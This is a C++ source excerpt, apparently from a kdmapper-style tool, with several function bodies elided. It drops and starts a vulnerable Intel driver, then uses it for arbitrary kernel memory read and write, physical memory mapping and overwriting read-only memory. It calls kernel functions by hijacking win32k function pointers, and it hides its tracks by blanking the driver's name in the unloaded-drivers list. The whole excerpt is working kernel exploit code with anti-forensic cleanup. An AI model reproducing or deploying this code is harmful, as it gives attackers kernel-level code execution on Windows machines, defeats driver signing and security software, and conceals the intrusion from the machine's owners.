...
HANDLE intel_driver::load()
{
	...
	if (!utils::create_file_from_memory(driver_path, 
		reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
	{
		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
		return nullptr;
	}

	if (!service::register_and_start(driver_path))
	{
...
void intel_driver::unload(HANDLE device_handle)
{
	...
	clear_mm_unloaded_drivers(device_handle);
	CloseHandle(device_handle);

	service::stop_and_remove(driver_name);
...
bool intel_driver::copy_memory(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
{
...
bool intel_driver::set_memory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
{
	if (!address || !size)
		return 0;
...
bool intel_driver::get_physical_address(HANDLE device_handle, uint64_t address, uint64_t * out_physical_address)
{
	if (!address)
		return 0;
...
uint64_t intel_driver::mm_map_io_space(HANDLE device_handle, uint64_t physical_address, uint32_t size)
{
...
bool intel_driver::mm_unmap_io_space(HANDLE device_handle, uint64_t address, uint32_t size)
{
	if (!address || !size)
		return false;
...
bool intel_driver::read_memory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return copy_memory(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::write_memory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size)
{
	return copy_memory(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::write_to_read_only_memory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
	...
	const uint64_t mapped_physical_memory = mm_map_io_space(device_handle, physical_address, size);
	...
	if (!mm_unmap_io_space(device_handle, mapped_physical_memory, size))
		std::cout << "[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;

	return result;
}

uint64_t intel_driver::allocate_pool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	if (!size)
		return 0;
	...
	if (!kernel_ExAllocatePool)
		kernel_ExAllocatePool = get_kernel_module_export(device_handle, utils::get_kernel_module_address("ntoskrnl.exe"), "ExAllocatePool");

	uint64_t allocated_pool = 0;

	if (!call_kernel_function(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size))
		return 0;

	return allocated_pool;
}

bool intel_driver::free_pool(HANDLE device_handle, uint64_t address)
{
	if (!address)
		return 0;
	...
	if (!kernel_ExFreePool)
		kernel_ExFreePool = get_kernel_module_export(device_handle, utils::get_kernel_module_address("ntoskrnl.exe"), "ExFreePool");

	return call_kernel_function<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::get_kernel_module_export(HANDLE device_handle, uint64_t kernel_module_base, const std::string & function_name)
{
...
bool intel_driver::get_NtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t * out_kernel_function_ptr, uint64_t * out_kernel_original_function_address)
{
	...
	{
		const uint64_t kernel_NtGdiDdDDIReclaimAllocations2 = get_kernel_module_export(device_handle, utils::get_kernel_module_address("win32kbase.sys"), "NtGdiDdDDIReclaimAllocations2");
		...
		if (!read_memory(device_handle, kernel_function_ptr_offset_address, &function_ptr_offset, sizeof(function_ptr_offset)))
			return false;

		kernel_function_ptr = kernel_NtGdiDdDDIReclaimAllocations2 + 0xB + function_ptr_offset;

		if (!read_memory(device_handle, kernel_function_ptr, &kernel_original_function_address, sizeof(kernel_original_function_address)))
			return false;
	}
...
bool intel_driver::get_NtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_handle, uint64_t * out_kernel_function_ptr, uint8_t * out_kernel_original_bytes)
{
	...
	{
		const uint64_t kernel_NtGdiGetCOPPCompatibleOPMInformation = get_kernel_module_export(device_handle, utils::get_kernel_module_address("win32kfull.sys"), "NtGdiGetCOPPCompatibleOPMInformation");
		...
		if (!read_memory(device_handle, kernel_function_ptr, kernel_original_jmp_bytes, sizeof(kernel_original_jmp_bytes)))
			return false;
	}
...
bool intel_driver::clear_mm_unloaded_drivers(HANDLE device_handle)
{
	ULONG buffer_size = 0;
	void* buffer = nullptr;
	...
	if (!read_memory(device_handle, object + 0x8, &device_object, sizeof(device_object)))
		return false;

	uint64_t driver_object = 0;

	if (!read_memory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)))
		return false;

	uint64_t driver_section = 0;

	if (!read_memory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)))
		return false;

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!read_memory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	us_driver_base_dll_name.Length = 0;

	if (!write_memory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;
